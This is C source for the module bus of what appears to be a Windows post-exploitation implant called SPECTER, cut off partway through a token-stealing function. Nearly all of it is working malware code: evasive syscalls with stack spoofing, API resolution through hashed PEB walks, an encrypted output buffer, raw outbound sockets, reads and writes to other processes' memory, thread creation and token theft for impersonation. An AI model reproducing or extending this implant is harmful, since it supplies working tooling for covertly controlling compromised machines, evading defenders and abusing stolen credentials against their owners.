/**
 * SPECTER Implant — Module Bus API Implementation
 *
 * All module operations route through this bus.  Each API function
 * calls the evasion engine which wraps syscalls with stack spoofing.
 * The output ring buffer uses ChaCha20 encryption at rest.
 */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"
#include "crypto.h"
#include "bus.h"
#include "peb.h"
#include "comms.h"
#include "comms_ws.h"
#include "sleep.h"
#include "task_exec.h"

#ifdef TEST_BUILD
#include <stdlib.h>
#ifndef AF_INET
#define AF_INET         2
#define SOCK_STREAM    1
#define IPPROTO_TCP    6
#define SOCKET_ERROR   (-1)
#define INVALID_SOCKET ((ULONG_PTR)(~(ULONG_PTR)0))
typedef struct _SOCKADDR {
    WORD sa_family;
    char sa_data[14];
} SOCKADDR;
#endif

__attribute__((weak))
DWORD task_socks_inbox_read(BYTE *buf, DWORD len) {
    (void)buf;
    (void)len;
    return 0;
}

__attribute__((weak))
NTSTATUS comms_tcp_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len) {
    (void)ctx; (void)data; (void)len;
    return STATUS_UNSUCCESSFUL;
}

__attribute__((weak))
NTSTATUS comms_tcp_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received) {
    (void)ctx; (void)buf; (void)buf_len;
    if (received) *received = 0;
    return STATUS_UNSUCCESSFUL;
}

__attribute__((weak))
NTSTATUS comms_tcp_close(COMMS_CONTEXT *ctx) {
    (void)ctx;
    return STATUS_SUCCESS;
}

__attribute__((weak))
NTSTATUS comms_tls_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len) {
    (void)ctx; (void)data; (void)len;
    return STATUS_UNSUCCESSFUL;
}

__attribute__((weak))
NTSTATUS comms_tls_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received) {
    (void)ctx; (void)buf; (void)buf_len;
    if (received) *received = 0;
    return STATUS_UNSUCCESSFUL;
}

__attribute__((weak))
NTSTATUS comms_tls_close(COMMS_CONTEXT *ctx) {
    (void)ctx;
    return STATUS_SUCCESS;
}

__attribute__((weak))
DWORD ws_build_frame(WS_CONTEXT *ctx, BYTE opcode, BOOL fin,
                     const BYTE *payload, DWORD payload_len,
                     BYTE *output, DWORD output_len) {
    (void)ctx; (void)opcode; (void)fin; (void)payload; (void)payload_len;
    (void)output; (void)output_len;
    return 0;
}

__attribute__((weak))
DWORD ws_parse_frame(const BYTE *wire_data, DWORD wire_len, WS_FRAME *frame) {
    (void)wire_data; (void)wire_len; (void)frame;
    return 0;
}

__attribute__((weak))
void ws_apply_mask(BYTE *data, DWORD data_len, const BYTE mask_key[4]) {
    (void)data; (void)data_len; (void)mask_key;
}
#endif

/* ------------------------------------------------------------------ */
/*  Static bus context storage                                         */
/* ------------------------------------------------------------------ */

static BUS_CONTEXT g_bus_ctx;

/* SOCKS interactive WebSocket virtual file state.  Modules access this
 * through "\\.\socks\ws-url", "\\.\socks\ws", and "\\.\socks\ws-close"
 * so the public module ABI stays stable. */
#define SOCKS_WS_MAX_HOST       256
#define SOCKS_WS_MAX_PATH       512
#define SOCKS_WS_RX_BUF_SIZE    WS_RECV_BUF_SIZE

typedef struct _SOCKS_WS_STATE {
    WS_CONTEXT ws;
    BOOL       connected;
    BOOL       use_tls;
    char       host[SOCKS_WS_MAX_HOST];
    char       host_header[SOCKS_WS_MAX_HOST + 8];
    char       path[SOCKS_WS_MAX_PATH];
    BYTE       rx_buf[SOCKS_WS_RX_BUF_SIZE];
    DWORD      rx_len;
} SOCKS_WS_STATE;

static SOCKS_WS_STATE g_socks_ws;

/* ------------------------------------------------------------------ */
/*  Forward declarations for bus API implementations                   */
/* ------------------------------------------------------------------ */

static PVOID     bus_mem_alloc(SIZE_T size, DWORD perms);
static BOOL      bus_mem_free(PVOID ptr);
static BOOL      bus_mem_protect(PVOID ptr, SIZE_T size, DWORD perms);

static HANDLE    bus_net_connect(const char *addr, DWORD port, DWORD proto);
static BOOL      bus_net_send(HANDLE handle, const BYTE *data, DWORD len);
static DWORD     bus_net_recv(HANDLE handle, BYTE *buf, DWORD len);
static BOOL      bus_net_close(HANDLE handle);

static HANDLE    bus_proc_open(DWORD pid, DWORD access);
static BOOL      bus_proc_read(HANDLE handle, PVOID addr, BYTE *buf, DWORD len);
static BOOL      bus_proc_write(HANDLE handle, PVOID addr, const BYTE *data, DWORD len);
static BOOL      bus_proc_close(HANDLE handle);

static HANDLE    bus_thread_create(PVOID func, PVOID param, BOOL suspended);
static BOOL      bus_thread_resume(HANDLE handle);
static BOOL      bus_thread_terminate(HANDLE handle);

static HANDLE    bus_token_steal(DWORD pid);
static BOOL      bus_token_impersonate(HANDLE handle);
static BOOL      bus_token_revert(void);
static HANDLE    bus_token_make(const char *user, const char *pass, const char *domain);

static DWORD     bus_file_read(const char *path, BYTE *buf, DWORD len);
static BOOL      bus_file_write(const char *path, const BYTE *data, DWORD len);
static BOOL      bus_file_delete(const char *path);
static PVOID     bus_file_list(const char *path);

static DWORD     bus_reg_read(DWORD hive, const char *path, const char *value);
static BOOL      bus_reg_write(DWORD hive, const char *path, const char *value,
                               const BYTE *data, DWORD type);
static BOOL      bus_reg_delete(DWORD hive, const char *path, const char *value);

static BOOL      bus_output(const BYTE *data, DWORD len, DWORD type);
static BOOL      bus_output_slot0(const BYTE *data, DWORD len, DWORD type);
static BOOL      bus_output_slot1(const BYTE *data, DWORD len, DWORD type);
static BOOL      bus_output_slot2(const BYTE *data, DWORD len, DWORD type);
static BOOL      bus_output_slot3(const BYTE *data, DWORD len, DWORD type);
static BOOL      bus_output_slot4(const BYTE *data, DWORD len, DWORD type);
static BOOL      bus_output_slot5(const BYTE *data, DWORD len, DWORD type);
static BOOL      bus_output_slot6(const BYTE *data, DWORD len, DWORD type);
static BOOL      bus_output_slot7(const BYTE *data, DWORD len, DWORD type);
static PVOID     bus_resolve(const char *dll_name, const char *func_name);
static void      bus_log(DWORD level, const char *msg);

static BOOL      socks_ws_connect_url(const BYTE *data, DWORD len);
static BOOL      socks_ws_send_frame(const BYTE *data, DWORD len);
static DWORD     socks_ws_recv_frame(BYTE *buf, DWORD len);
static BOOL      socks_ws_close(void);

/* ------------------------------------------------------------------ */
/*  Helper: get evasion context from the bus context                   */
/* ------------------------------------------------------------------ */

static EVASION_CONTEXT *bus_get_evasion(void) {
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
    if (!ctx)
        return NULL;
    return (EVASION_CONTEXT *)ctx->evasion_ctx;
}

/* ------------------------------------------------------------------ */
/*  Output ring buffer — encrypted circular buffer                     */
/* ------------------------------------------------------------------ */

/**
 * Generate a random encryption key for the output ring buffer.
 * Uses RDTSC-based PRNG as entropy source (same pattern as memguard).
 */
static void output_generate_key(OUTPUT_RING *ring) {
    /* RDTSC-based seed for PRNG */
    DWORD seed;
    __asm__ volatile ("rdtsc" : "=a"(seed) : : "edx");

    /* Simple LCG PRNG to fill key and nonce */
    DWORD state = seed;
    for (int i = 0; i < 32; i++) {
        state = state * 1103515245 + 12345;
        ring->enc_key[i] = (BYTE)(state >> 16);
    }
    for (int i = 0; i < 12; i++) {
        state = state * 1103515245 + 12345;
        ring->enc_nonce[i] = (BYTE)(state >> 16);
    }
}

void output_reset(OUTPUT_RING *ring) {
    if (!ring)
        return;
    spec_memset(ring->data, 0, BUS_OUTPUT_RING_SIZE);
    ring->head = 0;
    ring->tail = 0;
    ring->count = 0;
    ring->encrypted = FALSE;
    output_generate_key(ring);
}

DWORD output_available(const OUTPUT_RING *ring) {
    if (!ring)
        return 0;
    return ring->count;
}

/**
 * Output entry header written before each output chunk in the ring.
 * Allows drain to reconstruct individual output messages.
 */
typedef struct _OUTPUT_ENTRY_HDR {
    DWORD len;    /* Payload length */
    DWORD type;   /* OUTPUT_TEXT / OUTPUT_BINARY / OUTPUT_ERROR */
} OUTPUT_ENTRY_HDR;

static DWORD output_entry_counter(DWORD ring_pos) {
    return 1u + ring_pos;
}

static void output_crypt_entry(OUTPUT_RING *ring, DWORD entry_pos,
                               const BYTE *src, DWORD len, BYTE *dst) {
    if (!ring || !src || !dst || len == 0)
        return;

    spec_chacha20_encrypt(ring->enc_key, ring->enc_nonce,
                          output_entry_counter(entry_pos), src, len, dst);
}

BOOL output_write(OUTPUT_RING *ring, const BYTE *data, DWORD len, DWORD type) {
    if (!ring || !data || len == 0)
        return FALSE;

    /* Check total size: header + data */
    DWORD total = sizeof(OUTPUT_ENTRY_HDR) + len;
    if (total > BUS_OUTPUT_RING_SIZE - ring->count)
        return FALSE;  /* Not enough space */

    if (len > BUS_OUTPUT_ENTRY_MAX)
        return FALSE;  /* Single entry too large */

    /* Build header */
    OUTPUT_ENTRY_HDR hdr;
    hdr.len = len;
    hdr.type = type;

    /* Encrypt the header + data with ChaCha20 before writing to ring.
     * Use the current head position as the counter to get unique
     * keystream for each write. */
    BYTE enc_buf[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
    BYTE plain_buf[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];

    spec_memcpy(plain_buf, &hdr, sizeof(OUTPUT_ENTRY_HDR));
    spec_memcpy(plain_buf + sizeof(OUTPUT_ENTRY_HDR), data, len);

    output_crypt_entry(ring, ring->head, plain_buf, total, enc_buf);

    /* Write encrypted bytes to ring buffer (wrapping) */
    for (DWORD i = 0; i < total; i++) {
        ring->data[(ring->head + i) % BUS_OUTPUT_RING_SIZE] = enc_buf[i];
    }
    ring->head = (ring->head + total) % BUS_OUTPUT_RING_SIZE;
    ring->count += total;
    ring->encrypted = TRUE;

    /* Zero plaintext from stack */
    spec_memset(plain_buf, 0, total);

    return TRUE;
}

DWORD output_drain(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len) {
    if (!ring || !dest || dest_len == 0 || ring->count == 0)
        return 0;

    DWORD drained = 0;

    while (ring->count >= sizeof(OUTPUT_ENTRY_HDR)) {
        /* Read encrypted header from ring */
        BYTE enc_hdr_buf[sizeof(OUTPUT_ENTRY_HDR)];
        for (DWORD i = 0; i < sizeof(OUTPUT_ENTRY_HDR); i++) {
            enc_hdr_buf[i] = ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE];
        }

        /* Decrypt header */
        OUTPUT_ENTRY_HDR hdr;
        output_crypt_entry(ring, ring->tail, enc_hdr_buf,
                           sizeof(OUTPUT_ENTRY_HDR), (BYTE *)&hdr);

        DWORD total = sizeof(OUTPUT_ENTRY_HDR) + hdr.len;

        /* Sanity checks */
        if (hdr.len > BUS_OUTPUT_ENTRY_MAX || total > ring->count)
            break;

        /* Check if dest has room for the payload */
        if (drained + hdr.len > dest_len)
            break;

        /* Read full encrypted entry */
        BYTE enc_entry[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
        for (DWORD i = 0; i < total; i++) {
            enc_entry[i] = ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE];
        }

        /* Decrypt full entry */
        BYTE plain_entry[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
        output_crypt_entry(ring, ring->tail, enc_entry, total, plain_entry);

        /* Copy payload to dest (skip header) */
        spec_memcpy(dest + drained, plain_entry + sizeof(OUTPUT_ENTRY_HDR), hdr.len);
        drained += hdr.len;

        /* Zero ring region */
        for (DWORD i = 0; i < total; i++) {
            ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE] = 0;
        }

        ring->tail = (ring->tail + total) % BUS_OUTPUT_RING_SIZE;
        ring->count -= total;

        /* Zero plaintext from stack */
        spec_memset(plain_entry, 0, total);
    }

    if (ring->count == 0)
        ring->encrypted = FALSE;

    return drained;
}

DWORD output_drain_one_typed(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len,
                             DWORD *type_out) {
    if (!ring || !dest || dest_len == 0 || ring->count < sizeof(OUTPUT_ENTRY_HDR))
        return 0;

    BYTE enc_hdr_buf[sizeof(OUTPUT_ENTRY_HDR)];
    for (DWORD i = 0; i < sizeof(OUTPUT_ENTRY_HDR); i++) {
        enc_hdr_buf[i] = ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE];
    }

    OUTPUT_ENTRY_HDR hdr;
    output_crypt_entry(ring, ring->tail, enc_hdr_buf,
                       sizeof(OUTPUT_ENTRY_HDR), (BYTE *)&hdr);

    DWORD total = sizeof(OUTPUT_ENTRY_HDR) + hdr.len;
    if (hdr.len > BUS_OUTPUT_ENTRY_MAX || total > ring->count || hdr.len > dest_len)
        return 0;

    BYTE enc_entry[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
    for (DWORD i = 0; i < total; i++) {
        enc_entry[i] = ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE];
    }

    BYTE plain_entry[sizeof(OUTPUT_ENTRY_HDR) + BUS_OUTPUT_ENTRY_MAX];
    output_crypt_entry(ring, ring->tail, enc_entry, total, plain_entry);

    spec_memcpy(dest, plain_entry + sizeof(OUTPUT_ENTRY_HDR), hdr.len);
    if (type_out)
        *type_out = hdr.type;

    for (DWORD i = 0; i < total; i++) {
        ring->data[(ring->tail + i) % BUS_OUTPUT_RING_SIZE] = 0;
    }

    ring->tail = (ring->tail + total) % BUS_OUTPUT_RING_SIZE;
    ring->count -= total;
    if (ring->count == 0)
        ring->encrypted = FALSE;

    spec_memset(plain_entry, 0, total);
    return hdr.len;
}

DWORD output_drain_one(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len) {
    return output_drain_one_typed(ring, dest, dest_len, NULL);
}

/* ------------------------------------------------------------------ */
/*  bus_init — populate function table, init output ring               */
/* ------------------------------------------------------------------ */

NTSTATUS bus_init(IMPLANT_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    spec_memset(&g_bus_ctx, 0, sizeof(BUS_CONTEXT));
    g_bus_ctx.implant_ctx = ctx;

    /* Populate the API function table */
    MODULE_BUS_API *api = &g_bus_ctx.api;

    api->mem_alloc          = bus_mem_alloc;
    api->mem_free           = bus_mem_free;
    api->mem_protect        = bus_mem_protect;

#ifndef SPECTER_BAREBONE_MODULES
    api->net_connect        = bus_net_connect;
    api->net_send           = bus_net_send;
    api->net_recv           = bus_net_recv;
    api->net_close          = bus_net_close;

    api->proc_open          = bus_proc_open;
    api->proc_read          = bus_proc_read;
    api->proc_write         = bus_proc_write;
    api->proc_close         = bus_proc_close;

    api->thread_create      = bus_thread_create;
    api->thread_resume      = bus_thread_resume;
    api->thread_terminate   = bus_thread_terminate;

    api->token_steal        = bus_token_steal;
    api->token_impersonate  = bus_token_impersonate;
    api->token_revert       = bus_token_revert;
    api->token_make         = bus_token_make;

    api->file_read          = bus_file_read;
    api->file_write         = bus_file_write;
    api->file_delete        = bus_file_delete;
    api->file_list          = bus_file_list;

    api->reg_read           = bus_reg_read;
    api->reg_write          = bus_reg_write;
    api->reg_delete         = bus_reg_delete;
#endif

    api->output             = bus_output;
    api->resolve            = bus_resolve;
    api->log                = bus_log;

    /* Initialize the encrypted output ring buffer */
    output_reset(&g_bus_ctx.output_ring);

    /* Store bus context in implant context */
    ctx->module_bus = &g_bus_ctx;
    g_bus_ctx.initialized = TRUE;

    return STATUS_SUCCESS;
}

MODULE_BUS_API *bus_get_api(BUS_CONTEXT *bctx) {
    if (!bctx || !bctx->initialized)
        return NULL;
    return &bctx->api;
}

void bus_prepare_slot_api(MODULE_BUS_API *api, DWORD slot_idx) {
    if (!api)
        return;

    spec_memcpy(api, &g_bus_ctx.api, sizeof(MODULE_BUS_API));
    switch (slot_idx) {
    case 0: api->output = bus_output_slot0; break;
    case 1: api->output = bus_output_slot1; break;
    case 2: api->output = bus_output_slot2; break;
    case 3: api->output = bus_output_slot3; break;
    case 4: api->output = bus_output_slot4; break;
    case 5: api->output = bus_output_slot5; break;
    case 6: api->output = bus_output_slot6; break;
    case 7: api->output = bus_output_slot7; break;
    default: api->output = bus_output; break;
    }
}

/* ------------------------------------------------------------------ */
/*  Memory API implementations                                         */
/* ------------------------------------------------------------------ */

static PVOID bus_mem_alloc(SIZE_T size, DWORD perms) {
#ifdef TEST_BUILD
    (void)perms;
    return calloc(1, (size_t)size);
#else
    PVOID base = NULL;
    SIZE_T alloc_size = size;
    HANDLE process = (HANDLE)-1;  /* NtCurrentProcess */

    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTALLOCATEVIRTUALMEMORY,
        process, &base, (ULONG_PTR)0, &alloc_size,
        (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)perms);

    if (!NT_SUCCESS(status))
        return NULL;

#ifndef SPECTER_BAREBONE_MODULES
    /* Track allocation for sleep-time encryption */
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
    if (ctx && ctx->sleep_ctx)
        sleep_track_alloc((SLEEP_CONTEXT *)ctx->sleep_ctx, base, alloc_size);
#endif

    return base;
#endif
}

static BOOL bus_mem_free(PVOID ptr) {
    if (!ptr)
        return FALSE;

#ifdef TEST_BUILD
    free(ptr);
    return TRUE;
#else
#ifndef SPECTER_BAREBONE_MODULES
    /* Untrack from sleep heap list */
    IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
    if (ctx && ctx->sleep_ctx)
        sleep_untrack_alloc((SLEEP_CONTEXT *)ctx->sleep_ctx, ptr);
#endif

    SIZE_T size = 0;
    HANDLE process = (HANDLE)-1;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTFREEVIRTUALMEMORY,
        process, &ptr, &size, (ULONG)MEM_RELEASE);

    return NT_SUCCESS(status);
#endif
}

static BOOL bus_mem_protect(PVOID ptr, SIZE_T size, DWORD perms) {
    if (!ptr)
        return FALSE;

#ifdef TEST_BUILD
    (void)size;
    (void)perms;
    return TRUE;
#else
    ULONG old_protect;
    HANDLE process = (HANDLE)-1;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTPROTECTVIRTUALMEMORY,
        process, &ptr, &size, (ULONG)perms, &old_protect);

    return NT_SUCCESS(status);
#endif
}

/* ------------------------------------------------------------------ */
/*  Network API implementations — PEB-resolved ws2_32.dll               */
/* ------------------------------------------------------------------ */

/* DJB2 hashes for ws2_32 functions used by bus net API */
#define HASH_WSASOCKETA_BUS     0x8E018E3A  /* "WSASocketA"   */
#define HASH_CONNECT_BUS        0xD3764DCF  /* "connect"      */
#define HASH_SEND_BUS           0x7C9DDB4F  /* "send"         */
#define HASH_RECV_BUS           0x7C9D4D95  /* "recv"         */
#define HASH_CLOSESOCKET_BUS    0x494CB104  /* "closesocket"  */
#define HASH_SELECT_BUS         0x1B80E3C5  /* "select"       */
#define HASH_IOCTLSOCKET_BUS    0x06DCD609  /* "ioctlsocket"  */
#define HASH_LOGONUSERW         0xE4328B5A  /* "LogonUserW"   */

#define FIONBIO_BUS             0x8004667E

/* ws2_32.dll and advapi32.dll module hashes (may already be defined
   from comms.h or sleep.h in unity build) */
#ifndef HASH_WS2_32_DLL
#define HASH_WS2_32_DLL         0x9AD10B0F  /* "ws2_32.dll"   */
#endif
#ifndef HASH_ADVAPI32_DLL
#define HASH_ADVAPI32_DLL       0x67208A49  /* "advapi32.dll" */
#endif

/**
 * Resolve ws2_32.dll base via PEB walk, with LoadLibraryA fallback.
 */
static PVOID bus_resolve_ws2(void) {
    PVOID ws2 = find_module_by_hash(HASH_WS2_32_DLL);
    if (ws2) return ws2;

    /* LoadLibraryA fallback */
    typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) return NULL;

    fn_LoadLibraryA pLoadLib = (fn_LoadLibraryA)
        find_export_by_hash(k32, 0x0666395B);
    if (!pLoadLib) return NULL;

    char ws2_name[] = {'w','s','2','_','3','2','.','d','l','l',0};
    return pLoadLib(ws2_name);
}

typedef struct _BUS_FD_SET {
    unsigned int fd_count;
    ULONG_PTR fd_array[64];
} BUS_FD_SET;

typedef struct _BUS_TIMEVAL {
    long tv_sec;
    long tv_usec;
} BUS_TIMEVAL;

static BOOL bus_socket_readable(ULONG_PTR sock) {
    PVOID ws2 = bus_resolve_ws2();
    if (!ws2 || sock == 0 || sock == INVALID_SOCKET)
        return FALSE;

    typedef int (__attribute__((stdcall)) *fn_select_t)(
        int, BUS_FD_SET *, BUS_FD_SET *, BUS_FD_SET *, const BUS_TIMEVAL *);
    fn_select_t pSelect = (fn_select_t)find_export_by_hash(ws2, HASH_SELECT_BUS);
    if (!pSelect)
        return FALSE;

    BUS_FD_SET readfds;
    BUS_TIMEVAL tv;
    spec_memset(&readfds, 0, sizeof(readfds));
    spec_memset(&tv, 0, sizeof(tv));
    readfds.fd_count = 1;
    readfds.fd_array[0] = sock;

    return pSelect(0, &readfds, NULL, NULL, &tv) > 0;
}

static void bus_socket_set_nonblocking(ULONG_PTR sock) {
    PVOID ws2 = bus_resolve_ws2();
    if (!ws2 || sock == 0 || sock == INVALID_SOCKET)
        return;

    typedef int (__attribute__((stdcall)) *fn_ioctlsocket_t)(ULONG_PTR, long, ULONG *);
    fn_ioctlsocket_t pIoctl =
        (fn_ioctlsocket_t)find_export_by_hash(ws2, HASH_IOCTLSOCKET_BUS);
    if (!pIoctl)
        return;

    ULONG mode = 1;
    (void)pIoctl(sock, FIONBIO_BUS, &mode);
}

static HANDLE bus_net_connect(const char *addr, DWORD port, DWORD proto) {
    if (!addr)
        return INVALID_HANDLE_VALUE;

    PVOID ws2 = bus_resolve_ws2();
    if (!ws2) return INVALID_HANDLE_VALUE;

    /* Resolve WSASocketA, connect */
    typedef ULONG_PTR (__attribute__((stdcall)) *fn_WSASocketA)(
        int, int, int, PVOID, DWORD, DWORD);
    typedef int (__attribute__((stdcall)) *fn_connect_t)(
        ULONG_PTR, const SOCKADDR *, int);

    fn_WSASocketA pWSASocket = (fn_WSASocketA)
        find_export_by_hash(ws2, HASH_WSASOCKETA_BUS);
    fn_connect_t pConnect = (fn_connect_t)
        find_export_by_hash(ws2, HASH_CONNECT_BUS);

    if (!pWSASocket || !pConnect)
        return INVALID_HANDLE_VALUE;

    /* Determine socket type from proto: 0 = TCP, 1 = UDP */
    int sock_type = (proto == 1) ? 2 : SOCK_STREAM;    /* SOCK_DGRAM = 2 */
    int ip_proto = (proto == 1) ? 17 : IPPROTO_TCP;    /* IPPROTO_UDP = 17 */

    /* Create socket via WSASocketA (no overlapped) */
    ULONG_PTR sock = pWSASocket(AF_INET, sock_type, ip_proto, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
        return INVALID_HANDLE_VALUE;

    /* Build sockaddr_in on stack */
    BYTE sa[16];
    spec_memset(sa, 0, sizeof(sa));
    *(WORD *)sa = AF_INET;                          /* sin_family */
    /* htons: swap bytes of port */
    *(BYTE *)(sa + 2) = (BYTE)(port >> 8);
    *(BYTE *)(sa + 3) = (BYTE)(port & 0xFF);

    /* Parse dotted-decimal IPv4 address manually */
    DWORD ip = 0;
    DWORD octet = 0;
    DWORD shift = 0;
    for (DWORD i = 0; ; i++) {
        if (addr[i] >= '0' && addr[i] <= '9') {
            octet = octet * 10 + (addr[i] - '0');
        } else {
            ip |= (octet & 0xFF) << shift;
            shift += 8;
            octet = 0;
            if (addr[i] == '\0') break;
        }
    }
    *(DWORD *)(sa + 4) = ip;                        /* sin_addr (network order) */

    int ret = pConnect(sock, (const SOCKADDR *)sa, 16);
    if (ret == SOCKET_ERROR) {
        typedef int (__attribute__((stdcall)) *fn_closesocket_t)(ULONG_PTR);
        fn_closesocket_t pClose = (fn_closesocket_t)
            find_export_by_hash(ws2, HASH_CLOSESOCKET_BUS);
        if (pClose) pClose(sock);
        return INVALID_HANDLE_VALUE;
    }

    bus_socket_set_nonblocking(sock);
    return (HANDLE)sock;
}

static BOOL bus_net_send(HANDLE handle, const BYTE *data, DWORD len) {
    if (!data || len == 0)
        return FALSE;

    PVOID ws2 = bus_resolve_ws2();
    if (!ws2) return FALSE;

    typedef int (__attribute__((stdcall)) *fn_send_t)(
        ULONG_PTR, const char *, int, int);
    fn_send_t pSend = (fn_send_t)find_export_by_hash(ws2, HASH_SEND_BUS);
    if (!pSend) return FALSE;

    DWORD sent = 0;
    while (sent < len) {
        int n = pSend((ULONG_PTR)handle, (const char *)(data + sent),
                       (int)(len - sent), 0);
        if (n <= 0) return FALSE;
        sent += (DWORD)n;
    }
    return TRUE;
}

static DWORD bus_net_recv(HANDLE handle, BYTE *buf, DWORD len) {
    if (!buf || len == 0)
        return 0;

    PVOID ws2 = bus_resolve_ws2();
    if (!ws2) return 0;

    typedef int (__attribute__((stdcall)) *fn_recv_t)(
        ULONG_PTR, char *, int, int);
    fn_recv_t pRecv = (fn_recv_t)find_export_by_hash(ws2, HASH_RECV_BUS);
    if (!pRecv) return 0;

    int n = pRecv((ULONG_PTR)handle, (char *)buf, (int)len, 0);
    return (n > 0) ? (DWORD)n : 0;
}

static BOOL bus_net_close(HANDLE handle) {
    PVOID ws2 = bus_resolve_ws2();
    if (!ws2) return FALSE;

    typedef int (__attribute__((stdcall)) *fn_closesocket_t)(ULONG_PTR);
    fn_closesocket_t pClose = (fn_closesocket_t)
        find_export_by_hash(ws2, HASH_CLOSESOCKET_BUS);
    if (!pClose) return FALSE;

    return pClose((ULONG_PTR)handle) == 0;
}

/* ------------------------------------------------------------------ */
/*  Process API implementations                                        */
/* ------------------------------------------------------------------ */

static HANDLE bus_proc_open(DWORD pid, DWORD access) {
    HANDLE process = NULL;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;

    spec_memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);
    spec_memset(&cid, 0, sizeof(cid));
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENPROCESS,
        &process, (ULONG)access, &oa, &cid);

    if (!NT_SUCCESS(status))
        return INVALID_HANDLE_VALUE;
    return process;
}

static BOOL bus_proc_read(HANDLE handle, PVOID addr, BYTE *buf, DWORD len) {
    SIZE_T bytes_read = 0;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTREADVIRTUALMEMORY,
        handle, addr, buf, (SIZE_T)len, &bytes_read);

    return NT_SUCCESS(status);
}

static BOOL bus_proc_write(HANDLE handle, PVOID addr, const BYTE *data, DWORD len) {
    SIZE_T bytes_written = 0;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTWRITEVIRTUALMEMORY,
        handle, addr, (PVOID)data, (SIZE_T)len, &bytes_written);

    return NT_SUCCESS(status);
}

static BOOL bus_proc_close(HANDLE handle) {
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCLOSE, handle);
    return NT_SUCCESS(status);
}

/* ------------------------------------------------------------------ */
/*  Thread API implementations                                         */
/* ------------------------------------------------------------------ */

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED  0x00000001

static HANDLE bus_thread_create(PVOID func, PVOID param, BOOL suspended) {
    HANDLE thread = NULL;
    ULONG flags = suspended ? THREAD_CREATE_FLAGS_CREATE_SUSPENDED : 0;

    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATETHREADEX,
        &thread, (ULONG)0x1FFFFF, /* THREAD_ALL_ACCESS */
        NULL,                      /* OBJECT_ATTRIBUTES */
        (HANDLE)-1,                /* NtCurrentProcess  */
        func, param, flags,
        (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);

    if (!NT_SUCCESS(status))
        return INVALID_HANDLE_VALUE;
    return thread;
}

static BOOL bus_thread_resume(HANDLE handle) {
    ULONG prev_count = 0;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTRESUMETHREAD, handle, &prev_count);
    return NT_SUCCESS(status);
}

static BOOL bus_thread_terminate(HANDLE handle) {
    /* Close the thread handle — actual termination via
     * NtTerminateThread would need to be added to syscall table */
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCLOSE, handle);
    return NT_SUCCESS(status);
}

/* ------------------------------------------------------------------ */
/*  Token API implementations                                          */
/* ------------------------------------------------------------------ */

static HANDLE bus_token_steal(DWORD pid) {
    /* Open target process */
    HANDLE process = bus_proc_open(pid, PROCESS_QUERY_INFORMATION);
    if (process == INVALID_HANDLE_VALUE)
        return INVALID_HANDLE_VALUE;

    /* Open the process token */
    HANDLE token = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENPROCESSTOKEN,
        process, (ULONG)(TOKEN_DUPLICATE | TOKEN_QUERY), &token);

    if (!NT_SUCCESS(status)) {
        bus_proc_close(process);
        return INVALID_HANDLE_VALUE;
    }

    /* Duplicate the token as an impersonation token */
    HANDLE dup_token = NULL;
    OBJECT_ATTRIBUTES oa;
    spec_memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);

    /* SECURITY_QUALITY_OF_SERVICE for impersonation level */
    BYTE sqos[16];
    spec_memset(sqos, 0, sizeof(sqos));
    *(DWORD *)sqos = sizeof(sqos);       /* Length */
    *(DWORD *)(sqos + 4) = 2;            /* SecurityImpersonation level */
    oa.SecurityQualityOfService = sqos;

    status = evasion_syscall(bus_get_evasion(),
        HASH_NTDUPLICATETOKEN,
        token, (ULONG)(TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY),
        &oa, (BOOL)FALSE, (DWORD)TokenImpersonation, &dup_token);

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, token);
    bus_proc_close(process);

    if (!NT_SUCCESS(status))
